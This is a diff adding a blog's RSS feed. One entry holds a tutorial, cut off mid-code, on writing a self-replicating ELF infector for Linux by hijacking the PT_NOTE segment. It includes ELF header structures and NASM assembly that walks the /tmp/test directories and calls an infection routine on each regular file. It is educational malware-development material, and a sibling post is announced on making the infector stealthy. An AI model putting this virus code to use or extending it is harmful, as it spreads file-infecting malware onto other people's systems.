@@ -1,0 +1,889 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Assembly on Hacklagr0y</title>
+    <link>https://alagroy-42.github.io/tags/assembly/</link>
+    <description>Recent content in Assembly on Hacklagr0y</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Mon, 20 Jun 2022 14:25:16 +0200</lastBuildDate><atom:link href="https://alagroy-42.github.io/tags/assembly/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Advanced infectors: How to make our infector stealthy and hardly detectable</title>
+      <link>https://alagroy-42.github.io/malware_dev/infector_advanced/</link>
+      <pubDate>Mon, 20 Jun 2022 14:25:16 +0200</pubDate>
+      
+      <guid>https://alagroy-42.github.io/malware_dev/infector_advanced/</guid>
+      <description></description>
+      <content></content>
+    </item>
+    
+    <item>
+      <title>Infectors: how to make a simple self-replicating program on Linux.</title>
+      <link>https://alagroy-42.github.io/malware_dev/infector_basics/</link>
+      <pubDate>Mon, 20 Jun 2022 12:11:52 +0200</pubDate>
+      
+      <guid>https://alagroy-42.github.io/malware_dev/infector_basics/</guid>
+      <description>Introduction During this post, we will learn how to code a simple ELF infector on Linux. This infector will spread and sel-replicate inside the other binaries that it finds. It will get executed when infected binaries are launched so that it can spread even more. The payload will be harmless, just a signature to attest that the binary has been infected. This infector will be very basic and undisguised at all, any reverse-engineer could see that a file has been infected by executing a simple readelf command (We will get more into that later).</description>
+      <content>&lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
+&lt;p&gt;During this post, we will learn how to code a simple ELF infector on Linux. This infector will spread and sel-replicate inside the other binaries that it finds. It will get executed when infected binaries are launched so that it can spread even more. The payload will be harmless, just a signature to attest that the binary has been infected. This infector will be very basic and undisguised at all, any reverse-engineer could see that a file has been infected by executing a simple &lt;code&gt;readelf&lt;/code&gt; command (We will get more into that later).&lt;/p&gt;
+&lt;p&gt;You can check the full source code &lt;a href=&#34;https://github.com/alagroy-42/note_infector&#34;&gt;here&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;how-does-it-work-&#34;&gt;How does it work ?&lt;/h3&gt;
+&lt;p&gt;The technique that we will use here is called PT_NOTE segment hijacking. To understand how it works, we first need to understand the ELF format. The first element of an ELF file is the ELF header, it gives us the info we need to understand and read the rest of the file. Then comes the Program Header table, it will describe how the file is being organized. Each program header describes a part of the file, a part can belong to several program headers. Each entry is described by the following C structure (&lt;code&gt;man elf&lt;/code&gt; for more information).&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt;   p_type;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt;   p_flags;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               Elf64_Off  p_offset;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               Elf64_Addr p_vaddr;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               Elf64_Addr p_paddr;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint64_t&lt;/span&gt;   p_filesz;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint64_t&lt;/span&gt;   p_memsz;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint64_t&lt;/span&gt;   p_align;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;           } Elf64_Phdr;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;p_type&lt;/code&gt; field describes what kind of program header it is. There are two types that interests us :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;PT_LOAD: The array element specifies a loadable segment, described by p_filesz and p_memsz. The bytes from the file are mapped to the beginning of the memory segment. If the segment&#39;s memory size p_memsz is larger than the file size p_filesz, the &amp;quot;extra&amp;quot; bytes are defined to hold the value 0 and to follow the segment&#39;s initialized area. The file size may not be larger than the memory size. Loadable segment entries in the program header table appear in ascending order, sorted on the p_vaddr member.&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;PT_NOTE: The array element specifies the location of notes (ElfN_Nhdr).&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The &lt;code&gt;PT_LOAD&lt;/code&gt; are being loaded in memory which means that with the right permissions, we can execute the content of it. The &lt;code&gt;PT_NOTE&lt;/code&gt; simply gives the location of notes that are useless for the program during its execution. There should be a &lt;code&gt;PT_NOTE&lt;/code&gt; segment on every binary compiled the usual way. The technique will consists in changing this &lt;code&gt;PT_NOTE&lt;/code&gt; segment to a &lt;code&gt;PT_LOAD&lt;/code&gt; pointing to the end of the file where we will put our code. This way, it will be mapped into memory without altering the file too much and we will be able to execute it.&lt;/p&gt;
+&lt;p&gt;To execute it, we will look a bit more at the ELF header structure defined as&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define EI_NIDENT 16
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;           &lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; e_ident[EI_NIDENT];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint16_t&lt;/span&gt;      e_type;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint16_t&lt;/span&gt;      e_machine;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt;      e_version;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               ElfN_Addr     e_entry;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               ElfN_Off      e_phoff;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               ElfN_Off      e_shoff;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt;      e_flags;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint16_t&lt;/span&gt;      e_ehsize;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint16_t&lt;/span&gt;      e_phentsize;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint16_t&lt;/span&gt;      e_phnum;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint16_t&lt;/span&gt;      e_shentsize;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint16_t&lt;/span&gt;      e_shnum;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;uint16_t&lt;/span&gt;      e_shstrndx;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;           } ElfN_Ehdr;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The field that interests us here is &lt;code&gt;e_entry&lt;/code&gt; which will define the entrypoint of our program. If we put our code, the program will execute it and we will just have to transfer the execution back to the original entrypoint so that the program can keep its course.&lt;/p&gt;
+&lt;h3 id=&#34;the-code&#34;&gt;The code&lt;/h3&gt;
+&lt;h4 id=&#34;filesystem-reading&#34;&gt;Filesystem reading&lt;/h4&gt;
+&lt;p&gt;The first thing to do will be finding files to infect. For safety reason and because we don&amp;rsquo;t want to launch our program as root, we will not look for those in &lt;code&gt;/bin&lt;/code&gt; or &lt;code&gt;/usr/bin&lt;/code&gt; but in &lt;code&gt;/tmp/test&lt;/code&gt; and &lt;code&gt;/tmp/test2&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;_start:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;push&lt;/span&gt;    rbp
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rbp, rsp
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;sub&lt;/span&gt;     rsp, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;lea&lt;/span&gt;     rdi, [rel cwd]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rsi, O_DIRECTORY &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; O_RDONLY
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     eax, eax
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     al, SYS_OPEN
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rsp], eax      &lt;span style=&#34;color:#75715e&#34;&gt;; We open and save the fd of the cwd so that we will be able&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            &lt;span style=&#34;color:#75715e&#34;&gt;; to chdir back to it after we are don&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;lea&lt;/span&gt;     rdi, [rel dir1] &lt;span style=&#34;color:#75715e&#34;&gt;; /tmp/test&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;call&lt;/span&gt;    readdir
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;lea&lt;/span&gt;     rdi, [rel dir2] &lt;span style=&#34;color:#75715e&#34;&gt;; /tmp/test2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;call&lt;/span&gt;    readdir
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     edi, [rsp]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     eax, eax
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     al, SYS_FCHDIR
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;                 &lt;span style=&#34;color:#75715e&#34;&gt;; Back to our initial cwd to not break the executed binary (eg. ls)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     edi, [rsp]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     eax, eax
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     eax, SYS_CLOSE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;leave&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This code chunk will allow us to call the &lt;code&gt;readdir&lt;/code&gt; function that we will use to run through files in both of the target directories. To use those files then, we want to open them with relative paths to avoid string operations that are a bit painful in ASM so we will use &lt;code&gt;chdir&lt;/code&gt; to open them directly. Our first step to avoid breaking the infected program (eg &lt;code&gt;ls&lt;/code&gt;) will be to open our current working directory to be able to get back to it once the job is done.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;readdir:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;push&lt;/span&gt;    rbp
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rbp, rsp
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;sub&lt;/span&gt;     rsp, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_CHDIR  &lt;span style=&#34;color:#75715e&#34;&gt;; Let&amp;#39;s change the directory to open file,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            &lt;span style=&#34;color:#75715e&#34;&gt;; string operations are painful in ASM so relative paths will do&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rsi, O_DIRECTORY &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; O_RDONLY
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     eax, eax
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     eax, SYS_OPEN
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rsp], eax
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     rdi, rdi
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rsi, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     rdx, PROT_READ &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; PROT_WRITE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     r10, MAP_ANONYMOUS &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; MAP_PRIVATE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     r8, r8
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;dec&lt;/span&gt;     r8
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     r9, r9
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     eax, eax
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     al, SYS_MMAP
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;                 &lt;span style=&#34;color:#75715e&#34;&gt;; We map a page for the getdents buffer&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;    al, al
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jnz&lt;/span&gt;     end_readdir
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;], rax
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loop_dir:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     edi, [rsp]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rsi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdx, DIRENT_MAX_SIZE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     eax, eax
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     al, SYS_GETDENTS64
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     eax, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jle&lt;/span&gt;     end_readdir
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4&lt;/span&gt;], eax
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     r8, r8
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loop_buf_dirent:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;], r8w
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     r9, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;BYTE&lt;/span&gt; [r9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; r8 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; d_type], DT_REG
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jne&lt;/span&gt;     next_dirent
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;lea&lt;/span&gt;     rdi, [r9 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; r8 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; d_name]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;call&lt;/span&gt;    infect          &lt;span style=&#34;color:#75715e&#34;&gt;; We only infect regular files &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;next_dirent:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     r9, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;movzx&lt;/span&gt;   r8, &lt;span style=&#34;color:#66d9ef&#34;&gt;WORD&lt;/span&gt; [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;]
